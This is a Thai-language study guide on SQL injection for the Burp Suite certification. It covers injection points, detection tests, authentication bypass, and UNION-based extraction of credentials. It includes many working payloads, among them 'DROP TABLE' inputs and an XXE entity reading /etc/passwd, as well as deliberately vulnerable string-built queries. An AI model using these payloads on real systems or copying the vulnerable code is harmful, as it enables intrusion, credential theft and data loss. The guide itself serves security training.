# SQL Injection — Detection & Basic Exploitation

> **Stage 2: Privilege Escalation** — หา SQLi และ exploit เพื่อดึง credentials

---

## Table of Contents
1. [SQL Injection คืออะไร](#sql-injection-คืออะไร)
2. [Injection Points (Deep Dive)](#injection-points--จุดที่-inject-ได้-deep-dive)
   - [URL Parameters](#1-url-parameters-get--พบบ่อยสุด)
   - [Form Data (POST)](#2-form-data-post--login-register-search)
   - [HTTP Headers](#3-http-headers--ทำไมถึง-inject-ได้)
   - [JSON Body](#4-json-body--modern-apis)
   - [XML Body](#5-xml-body--soap-apis-legacy-systems)
   - [Cookies](#6-cookies--session--preferences)
   - [Path Parameters](#7-path-parameters--rest-apis)
   - [File Upload Filename](#8-file-upload-filename--rare-but-possible)
   - [GraphQL](#9-graphql--modern-api)
   - [WebSocket](#10-websocket-messages)
3. [Detection Methods](#detection-step-1-single-quote-test)
   - [Why Single Quote Causes Error](#ทำไม--ทำให้เกิด-error)
   - [SQL Parser](#sql-parser-ทำงานยังไง)
   - [Error Messages by Database](#error-messages-แต่ละ-database)
   - [Why Error = Vulnerable](#ทำไม-error-ถึงบอกว่า-vulnerable)
4. [Common Detection Payloads](#common-detection-payloads)
5. [Understanding the Query](#understanding-the-query)
6. [Authentication Bypass](#exploitation-authentication-bypass)
7. [Extracting Data](#exploitation-extracting-data)
8. [Cheat Sheet](#cheat-sheet-quick-reference)
9. [Burp Suite Tips](#burp-suite-tips)

---

## SQL Injection คืออะไร?

**SQLi** = การ inject SQL code เข้าไปใน input ที่ถูกนำไปสร้าง query

```
Normal:    SELECT * FROM users WHERE username = 'admin'
                                                 ↑
                                            user input

Injected:  SELECT * FROM users WHERE username = 'admin' OR '1'='1'--'
                                                 ↑
                                     malicious input ที่เปลี่ยน logic
```

---

## Injection Points — จุดที่ inject ได้ (Deep Dive)

### ทำไม Input ถึงไปอยู่ใน SQL Query?

**หลักการ:** ทุกที่ที่ **user-controlled data** ถูกนำไปใช้ใน SQL query = potential SQLi

```
User Input → Backend Code → SQL Query → Database
     ↑
  ตรงนี้ inject ได้
```

---

### 1. URL Parameters (GET) — พบบ่อยสุด

**ทำงานยังไง:**
```
URL: https://shop.com/products?category=Gifts&sort=price
```

**Backend:**
```python
category = request.args.get('category')  # "Gifts"
sort = request.args.get('sort')          # "price"

query = f"SELECT * FROM products WHERE category = '{category}' ORDER BY {sort}"
# SELECT * FROM products WHERE category = 'Gifts' ORDER BY price
```

**Injection Points:**
```
?category=Gifts' OR '1'='1'--
?sort=price; DROP TABLE users--
?id=1 UNION SELECT username,password FROM users--
```

**พบที่ไหนในเว็บ:**
- Product filters (category, price range, color)
- Search functionality
- Pagination (`?page=1`, `?limit=10`)
- Sorting (`?sort=price&order=asc`)
- User profiles (`?user_id=123`)

---

### 2. Form Data (POST) — Login, Register, Search

**ทำงานยังไง:**
```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=secret123
```

**Backend:**
```python
username = request.form['username']
password = request.form['password']

query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

**Injection:**
```
username=admin'--&password=anything
username=admin' OR '1'='1'--&password=x
```

**พบที่ไหน:**
- Login forms
- Registration forms
- Search forms
- Contact forms (ถ้า save ลง DB)
- Comment/Review submission
- Profile update forms

---

### 3. HTTP Headers — ทำไมถึง inject ได้?

**เหตุผลที่ Headers ไปอยู่ใน Query:**

| Header | ทำไมถูกเก็บ | ตัวอย่าง |
|--------|-----------|---------|
| `User-Agent` | Analytics, logging | เก็บว่า user ใช้ browser อะไร |
| `Referer` | Analytics, tracking | เก็บว่ามาจากเว็บไหน |
| `X-Forwarded-For` | Logging real IP | เก็บ IP จริงหลัง proxy |
| `Cookie` | Session, preferences | หลาย values อาจถูก query |
| `Accept-Language` | Personalization | เก็บ language preference |
| `Host` | Multi-tenant apps | เลือก database ตาม domain |

#### ตัวอย่าง: User-Agent Logging

**Scenario:** เว็บเก็บ log ว่าใครเข้ามาใช้ browser อะไร

```python
# Backend code
user_agent = request.headers.get('User-Agent')
ip_address = request.headers.get('X-Forwarded-For')

# เก็บ log ลง database
query = f"INSERT INTO access_logs (ip, user_agent, timestamp) VALUES ('{ip_address}', '{user_agent}', NOW())"
```

**Normal Request:**
```http
GET /products HTTP/1.1
Host: shop.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
X-Forwarded-For: 192.168.1.100
```

**SQLi Attack:**
```http
GET /products HTTP/1.1
Host: shop.com
User-Agent: Mozilla/5.0' OR '1'='1'--
X-Forwarded-For: 192.168.1.1' UNION SELECT username,password,null FROM users--
```

#### ตัวอย่าง: Referer-based Tracking

```python
# เว็บเก็บว่า user มาจาก link ไหน
referer = request.headers.get('Referer')
query = f"INSERT INTO referrals (source, timestamp) VALUES ('{referer}', NOW())"
```

**Attack:**
```http
GET /products HTTP/1.1
Referer: https://google.com' UNION SELECT table_name,null FROM information_schema.tables--
```

#### ตัวอย่าง: Cookie-based Query

```python
# เว็บดึง user preferences จาก cookie
tracking_id = request.cookies.get('TrackingId')
query = f"SELECT preferences FROM user_prefs WHERE tracking_id = '{tracking_id}'"
```

**Attack:**
```http
GET /products HTTP/1.1
Cookie: TrackingId=abc123' AND 1=1--; session=xyz
```

#### วิธี Test Header Injection ใน Burp:
1. Intercept request
2. ส่งไป Repeater
3. แก้ไข header ที่ละตัว ใส่ `'`
4. ดู response ว่ามี error ไหม

---

### 4. JSON Body — Modern APIs

**ทำงานยังไง:**

**Request:**
```http
POST /api/login HTTP/1.1
Content-Type: application/json

{
  "username": "admin",
  "password": "secret123"
}
```

**Backend (Node.js):**
```javascript
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;

    // VULNERABLE!
    const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
    db.query(query);
});
```

**Injection ใน JSON:**

```json
{
  "username": "admin'--",
  "password": "anything"
}
```

```json
{
  "username": "admin",
  "password": "' OR '1'='1'--"
}
```

#### JSON Special Cases:

**Nested Objects:**
```json
{
  "user": {
    "name": "admin'--",
    "role": "user"
  }
}
```

**Arrays:**
```json
{
  "ids": [1, 2, "3 OR 1=1"]
}
```

**Backend ที่ vulnerable:**
```javascript
const ids = req.body.ids.join(',');
const query = `SELECT * FROM products WHERE id IN (${ids})`;
// SELECT * FROM products WHERE id IN (1,2,3 OR 1=1)
```

**JSON Injection Payloads:**
```json
{"username": "admin'--", "password": "x"}
{"username": "admin' OR '1'='1'--", "password": "x"}
{"username": "admin\"--", "password": "x"}
{"id": "1 UNION SELECT username,password FROM users--"}
```

---

### 5. XML Body — SOAP APIs, Legacy Systems

**ทำงานยังไง:**

**Request:**
```http
POST /api/getUser HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<request>
  <username>admin</username>
  <password>secret123</password>
</request>
```

**Backend:**
```python
import xml.etree.ElementTree as ET

xml_data = request.data
root = ET.fromstring(xml_data)
username = root.find('username').text
password = root.find('password').text

query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

**Injection ใน XML:**

```xml
<?xml version="1.0"?>
<request>
  <username>admin'--</username>
  <password>anything</password>
</request>
```

```xml
<?xml version="1.0"?>
<request>
  <username>admin' OR '1'='1'--</username>
  <password>x</password>
</request>
```

#### XML + XXE Combo:
บางทีเจอ XXE ด้วย ลองควบคู่กัน:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<request>
  <username>&xxe;</username>
  <password>test</password>
</request>
```

---

### 6. Cookies — Session & Preferences

**ทำงานยังไง:**

**Scenario:** เว็บเก็บ user preferences ใน cookie

```http
GET /dashboard HTTP/1.1
Cookie: session=abc123; userId=5; theme=dark
```

**Backend:**
```python
user_id = request.cookies.get('userId')
query = f"SELECT * FROM users WHERE id = {user_id}"
```

**Injection:**
```http
Cookie: session=abc123; userId=5 OR 1=1; theme=dark
Cookie: session=abc123; userId=5 UNION SELECT username,password,null FROM users--; theme=dark
```

**พบบ่อย:**
- `userId`, `user_id` — ดึง user data
- `TrackingId` — analytics
- `preferences` — user settings
- `last_viewed` — product history

---

### 7. Path Parameters — REST APIs

**ทำงานยังไง:**

```
GET /api/users/123/orders
              ↑
         path parameter
```

**Backend (Express.js):**
```javascript
app.get('/api/users/:userId/orders', (req, res) => {
    const userId = req.params.userId;
    const query = `SELECT * FROM orders WHERE user_id = ${userId}`;
});
```

**Injection:**
```
GET /api/users/123 OR 1=1/orders
GET /api/users/123 UNION SELECT * FROM users--/orders
```

---

### 8. File Upload Filename — Rare but Possible

**ทำงานยังไง:**

**Request:**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="report.pdf"
Content-Type: application/pdf

[file content]
------WebKitFormBoundary--
```

**Backend:**
```python
filename = request.files['file'].filename
query = f"INSERT INTO uploads (filename, user_id) VALUES ('{filename}', 1)"
```

**Injection:**
```
filename="report.pdf' OR '1'='1'--.pdf"
filename="test'; DROP TABLE uploads;--.pdf"
```

---

### 9. GraphQL — Modern API

**ทำงานยังไง:**

```http
POST /graphql HTTP/1.1
Content-Type: application/json

{
  "query": "{ user(id: 1) { username email } }"
}
```

**Vulnerable Backend:**
```javascript
const resolvers = {
    user: (args) => {
        const query = `SELECT * FROM users WHERE id = ${args.id}`;
        return db.query(query);
    }
};
```

**Injection:**
```json
{
  "query": "{ user(id: \"1 OR 1=1\") { username password } }"
}
```

---

### 10. WebSocket Messages

**ทำงานยังไง:**

```javascript
// Client sends
socket.send(JSON.stringify({
    action: "getUser",
    userId: 123
}));
```

**Backend:**
```javascript
socket.on('message', (data) => {
    const msg = JSON.parse(data);
    if (msg.action === 'getUser') {
        const query = `SELECT * FROM users WHERE id = ${msg.userId}`;
    }
});
```

**Injection:**
```json
{
  "action": "getUser",
  "userId": "123 OR 1=1"
}
```

---

### Summary: Where to Look for SQLi

| Location | Likelihood | วิธี Test |
|----------|-----------|----------|
| URL Parameters | สูงมาก | ใส่ `'` ใน parameter |
| POST Form Data | สูงมาก | Intercept แล้วแก้ |
| JSON Body | สูง | แก้ค่าใน JSON |
| Cookies | ปานกลาง | แก้ cookie value |
| HTTP Headers | ต่ำ-ปานกลาง | แก้ทีละ header |
| XML Body | ปานกลาง | แก้ค่าใน XML element |
| Path Parameters | ปานกลาง | แก้ค่าใน URL path |
| GraphQL | ปานกลาง | Inject ใน arguments |
| WebSocket | ต่ำ | Intercept WS messages |
| Filename | ต่ำ | แก้ filename ใน upload |

---

## Detection Step 1: Single Quote Test

**วิธีง่ายสุด:** ใส่ `'` (single quote) แล้วดูว่าเกิดอะไรขึ้น

```
Normal:  https://shop.com/products?category=Gifts
Test:    https://shop.com/products?category=Gifts'
                                                 ↑
```

### ทำไม `'` ทำให้เกิด Error?

**Query ปกติ:**
```sql
SELECT * FROM products WHERE category = 'Gifts'
                                        ↑     ↑
                                    เปิด quote  ปิด quote
```

**Quote ต้องเป็นคู่เสมอ** — เปิดแล้วต้องปิด

**เมื่อใส่ `'` เข้าไป:**

Input: `Gifts'`
```sql
SELECT * FROM products WHERE category = 'Gifts''
                                        ↑     ↑↑
                                    เปิด    ปิด + quote เกิน!
```

Database เห็น:
```
'Gifts'  ← string ปกติ
'        ← quote เกินมา 1 ตัว = ERROR!
```

### SQL Parser ทำงานยังไง

```
┌─────────────────────────────────────────────────────────────┐
│                      SQL Parser                             │
├─────────────────────────────────────────────────────────────┤
│  Input: SELECT * FROM products WHERE category = 'Gifts''    │
│                                                             │
│  Step 1: SELECT    ✓                                        │
│  Step 2: *         ✓                                        │
│  Step 3: FROM      ✓                                        │
│  Step 4: products  ✓                                        │
│  Step 5: WHERE     ✓                                        │
│  Step 6: category  ✓                                        │
│  Step 7: =         ✓                                        │
│  Step 8: 'Gifts'   ✓ (string)                               │
│  Step 9: '         ✗ ERROR! ← ไม่รู้จะทำอะไรกับ quote นี้    │
│                                                             │
│  Result: SYNTAX ERROR                                       │
└─────────────────────────────────────────────────────────────┘
```

### ผลลัพธ์ที่บอกว่า Vulnerable:

| Response | แปลว่า |
|----------|--------|
| **500 Internal Server Error** | Query พัง = น่าสงสัยมาก |
| **Database error message** | Confirm SQLi! |
| **หน้าเว็บเปลี่ยน/พัง** | Query พัง |
| **Response time นานขึ้นมาก** | อาจเป็น Time-based SQLi |

### Error Messages แต่ละ Database

#### MySQL
```
You have an error in your SQL syntax; check the manual that
corresponds to your MySQL server version for the right syntax
to use near ''Gifts''' at line 1
                ↑
           บอกตำแหน่งที่พัง
```
**สิ่งที่บอก:** `syntax error` = query ผิด format, `near ''Gifts''` = พังตรงนี้

#### PostgreSQL
```
ERROR: syntax error at or near "Gifts"
LINE 1: SELECT * FROM products WHERE category = 'Gifts''
                                                        ^
POSITION: 52
```
**สิ่งที่บอก:** `^` ชี้ตำแหน่งที่ผิด, `POSITION: 52` = character ที่ 52

#### Microsoft SQL Server (MSSQL)
```
Unclosed quotation mark after the character string 'Gifts'.
Incorrect syntax near 'Gifts'.
```
**สิ่งที่บอก:** `Unclosed quotation mark` = quote ไม่ปิด (ชัดเจนมาก)

#### Oracle
```
ORA-00933: SQL command not properly ended
ORA-01756: quoted string not properly terminated
```
**สิ่งที่บอก:** `ORA-01756` = string ไม่ปิด

#### SQLite
```
Error: unrecognized token: "'"
Error: near "'": syntax error
```

### ทำไม Error ถึงบอกว่า Vulnerable?

```
┌────────────────────────────────────────────────────┐
│  ถ้าเห็น SQL Error = Input ถูกนำไป execute โดยตรง   │
│                                                    │
│  Input → ไม่มี sanitization → SQL Query → Error    │
│                     ↑                              │
│            ตรงนี้ไม่มีการป้องกัน!                    │
└────────────────────────────────────────────────────┘
```

**ถ้า secure:**
```
Input: Gifts'
↓
Sanitization: Gifts\' (escape quote)
↓
Query: SELECT * FROM products WHERE category = 'Gifts\''
↓
Result: ค้นหา "Gifts'" เป็น string ปกติ (ไม่ error)
```

**ถ้า vulnerable:**
```
Input: Gifts'
↓
No sanitization
↓
Query: SELECT * FROM products WHERE category = 'Gifts''
↓
Result: SYNTAX ERROR!
```

### Different Error Responses

| Type | ตัวอย่าง | บอกอะไร |
|------|---------|--------|
| **Verbose Error** | `MySQL Error: syntax error near 'Gifts''` | Database type, ตำแหน่ง, query structure |
| **Generic Error** | `500 Internal Server Error` | มีปัญหา แต่ซ่อน details |
| **Custom Error Page** | `Oops! Something went wrong` | ซ่อน error แต่ behavior ต่าง |
| **No Visible Error** | หน้าเว็บปกติ แต่ข้อมูลหาย | ต้องใช้ Boolean/Time-based test |

### Error บอกอะไรได้บ้าง?

| Error Message | บอกอะไร |
|---------------|---------|
| `MySQL` / `MariaDB` | Database type |
| `PostgreSQL` / `PG::` | Database type |
| `ORA-` | Oracle database |
| `Microsoft` / `ODBC` | MSSQL |
| `SQLite` | SQLite |
| `near 'xxx'` | ตำแหน่งที่ inject |
| `column "xxx"` | ชื่อ column จริง |
| `table "xxx"` | ชื่อ table จริง |

### Lab: ทดลอง Input ต่างๆ

**Query เดิม:**
```sql
SELECT * FROM users WHERE username = '[INPUT]' AND password = '[INPUT]'
```

| Input | Query ที่ได้ | Result |
|-------|-------------|--------|
| `admin` | `...username = 'admin' AND...` | ปกติ |
| `admin'` | `...username = 'admin'' AND...` | **ERROR** — quote เกิน |
| `admin''` | `...username = 'admin''' AND...` | ค้นหา `admin'` (escape) |
| `admin'--` | `...username = 'admin'--' AND...` | **SUCCESS** — bypass! |

### สรุป: Single Quote Test

| Response | แปลว่า | Next Step |
|----------|--------|-----------|
| SQL syntax error | **Confirmed SQLi!** | ลอง payload ต่อ |
| 500 Internal Server Error | น่าจะ SQLi | ลอง Boolean test |
| หน้าเว็บเปลี่ยน/ข้อมูลหาย | อาจเป็น SQLi | ลอง Boolean test |
| ปกติทุกอย่าง | อาจไม่มี SQLi หรือ filtered | ลอง bypass หรือ injection point อื่น |

---

## Detection Step 2: Boolean Condition Test

### ทดสอบว่า input ถูกนำไป execute จริงไหม

```
Original:       https://shop.com/products?category=Gifts
                → แสดง 10 สินค้า

True condition: https://shop.com/products?category=Gifts' AND '1'='1
                → ถ้า SQLi มี ควรแสดง 10 สินค้า (เหมือนเดิม)

False condition: https://shop.com/products?category=Gifts' AND '1'='2
                 → ถ้า SQLi มี ควรแสดง 0 สินค้า (false = ไม่มีผล)
```

**ถ้าผลลัพธ์ต่างกัน = SQLi confirmed!**

---

## Detection Step 3: Time-based Test

บาง database รัน query หลายอันได้:

```sql
https://shop.com/products?category=Gifts'; SELECT SLEEP(5)--
                                         ↑
                                    ; เริ่ม query ใหม่
```

ถ้า response มาช้า 5 วินาที = vulnerable

---

## Common Detection Payloads

### Basic Payloads
```
'
''
'--
' --
'#
' #
'/*
'/**/
```

### Boolean-based
```
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*
" OR "1"="1
" OR "1"="1"--
' OR 1=1--
' OR 'a'='a
```

### Time-based (ถ้าไม่เห็น output)
```sql
' AND SLEEP(5)--                                    -- MySQL
' || pg_sleep(5)--                                  -- PostgreSQL
'; WAITFOR DELAY '0:0:5'--                          -- MSSQL
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--          -- Oracle
```

---

## Understanding the Query

### ตัวอย่าง: Login Form

**Backend code (vulnerable):**
```python
username = request.form['username']
password = request.form['password']

query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
```

### Normal Login:
```
Input:  username=admin, password=secret123

Query:  SELECT * FROM users WHERE username='admin' AND password='secret123'
                                             ↑                     ↑
                                        user input            user input
```

### SQLi - Method 1: Comment Out Password
```
Input:  username=admin'--, password=anything

Query:  SELECT * FROM users WHERE username='admin'--' AND password='anything'
                                                   ↑
                                         ตั้งแต่ -- เป็น comment ไม่ถูก execute

Result: SELECT * FROM users WHERE username='admin'
        → ไม่ต้องรู้ password!
```

### SQLi - Method 2: OR Always True
```
Input:  username=admin' OR '1'='1, password=anything

Query:  SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
                                                       ↑
                                              1=1 เป็น true เสมอ
```

### SQLi - Method 3: Comment ทั้ง Password Check
```
Input:  username=admin' OR 1=1--, password=anything

Query:  SELECT * FROM users WHERE username='admin' OR 1=1--' AND password='anything'

Result: SELECT * FROM users WHERE username='admin' OR 1=1
        → Return ทุก users! (login เป็น user แรก = admin)
```

---

## Exploitation: Authentication Bypass

### Scenario: Login as Admin

**Target:** Login โดยไม่รู้ password

**Payloads ที่ใช้:**

| Payload (username field) | อธิบาย |
|-------------------------|--------|
| `admin'--` | Comment ทิ้ง password check |
| `admin'#` | MySQL comment |
| `admin'/*` | Multi-line comment |
| `' OR 1=1--` | Return first user (usually admin) |
| `' OR '1'='1` | Always true |
| `admin' OR '1'='1'--` | Login as admin specifically |

### Password Field Injection

บางทีต้อง inject ที่ password แทน:

```
Username: admin
Password: ' OR '1'='1'--

Query: SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1'--'
```

---

## Exploitation: Extracting Data

### Step 1: ยืนยันจำนวน Columns

**ใช้ ORDER BY:**
```
' ORDER BY 1--    → OK
' ORDER BY 2--    → OK
' ORDER BY 3--    → OK
' ORDER BY 4--    → Error! = มี 3 columns
```

**ใช้ UNION SELECT NULL:**
```
' UNION SELECT NULL--           → Error
' UNION SELECT NULL,NULL--      → Error
' UNION SELECT NULL,NULL,NULL-- → OK! = 3 columns
```

### Step 2: หา Column ที่แสดงผล

```sql
' UNION SELECT 'a',NULL,NULL--     → ดูว่า 'a' แสดงไหม
' UNION SELECT NULL,'a',NULL--     → ถ้า column 2 แสดง 'a' = ใช้ได้
' UNION SELECT NULL,NULL,'a'--
```

### Step 3: Extract Database Version

```sql
-- MySQL
' UNION SELECT NULL,@@version,NULL--

-- PostgreSQL
' UNION SELECT NULL,version(),NULL--

-- MSSQL
' UNION SELECT NULL,@@version,NULL--
```

### Step 4: List Tables

```sql
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--

-- Filter เฉพาะ current database
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
```

### Step 5: List Columns

```sql
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Step 6: Extract Data

```sql
-- ดึง username และ password
' UNION SELECT NULL,username,password FROM users--

-- ถ้ามีแค่ 1 column ที่แสดงผล ต้อง concat
' UNION SELECT NULL,username||'~'||password,NULL FROM users--       -- PostgreSQL
' UNION SELECT NULL,CONCAT(username,'~',password),NULL FROM users-- -- MySQL
```

---

## Cheat Sheet: Quick Reference

### Identify Database Type

| Payload | ถ้าใช้ได้ = |
|---------|-----------|
| `' AND '1'='1' --` | Generic |
| `' AND '1'='1' #` | MySQL |
| `' AND '1'='1' /*` | MySQL/MSSQL |
| `' \|\| '1'='1` | PostgreSQL/Oracle |

### Version Queries

| Database | Query |
|----------|-------|
| MySQL | `@@version` หรือ `version()` |
| PostgreSQL | `version()` |
| MSSQL | `@@version` |
| Oracle | `SELECT banner FROM v$version WHERE ROWNUM=1` |
| SQLite | `sqlite_version()` |

### String Concatenation (ใช้รวมหลาย columns)

| Database | Syntax | ตัวอย่าง |
|----------|--------|---------|
| MySQL | `CONCAT(a,b)` | `CONCAT(username,':',password)` |
| PostgreSQL | `a\|\|b` | `username\|\|':'||password` |
| MSSQL | `a+b` | `username+':'+password` |
| Oracle | `a\|\|b` | `username\|\|':'||password` |

### Comments

| Database | Single Line | Alternative |
|----------|-------------|-------------|
| MySQL | `-- ` (space!) | `#` |
| PostgreSQL | `--` | |
| MSSQL | `--` | |
| Oracle | `--` | |

---

## Burp Suite Tips

### 1. Intercept & Modify
- ดัก request ใน Proxy
- ส่งไป Repeater (Ctrl+R)
- แก้ไข parameter แล้วยิง

### 2. Intruder for Fuzzing
- ใส่ payload position: `category=§Gifts§`
- ใช้ SQLi wordlist
- ดู response length/status ที่ต่าง

### 3. Scanner (Targeted)
- Right-click parameter → "Scan defined insertion points"
- ไม่ต้อง scan ทั้งเว็บ

---

## Practice Flow

```
1. หา injection point
   ↓
2. ใส่ ' ดู error
   ↓
3. ลอง ' OR '1'='1'--
   ↓
4. ถ้า behavior เปลี่ยน = vulnerable
   ↓
5. หาจำนวน columns (ORDER BY)
   ↓
6. หา column ที่แสดงผล (UNION SELECT 'a')
   ↓
7. Extract: version → tables → columns → data
```

---

## BSCP Exam Tips

| Situation | Action |
|-----------|--------|
| Advanced Search มี filter หลายอัน | ลอง SQLi ทุก parameter |
| Product category filter | UNION attack เพื่อดึง credentials |
| Login form | Authentication bypass |
| ไม่เห็น output | ใช้ Blind SQLi (Time-based) |

---

## Burp Suite Testing Flow for All Injection Points

```
1. เปิด Proxy → Browse เว็บ
   ↓
2. ดู HTTP History → หา requests ที่มี parameters
   ↓
3. ส่งไป Repeater (Ctrl+R)
   ↓
4. Test ทุก input point:
   - URL params
   - POST body (form-urlencoded, JSON, XML)
   - Headers (User-Agent, Referer, Cookie, X-Forwarded-For)
   - Path parameters
   ↓
5. ใส่ ' ดู error
   ↓
6. ถ้า error → ลอง payload ต่อ
   ↓
7. ถ้าไม่มี error → ลอง Boolean/Time-based
```

---

## Next Steps

- [03-UNION-Attack.md](./03-UNION-Attack.md) — UNION-based data extraction
- [04-Blind-SQLi.md](./04-Blind-SQLi.md) — Boolean & Time-based blind
- [05-SQLmap-Usage.md](./05-SQLmap-Usage.md) — Automation with SQLmap
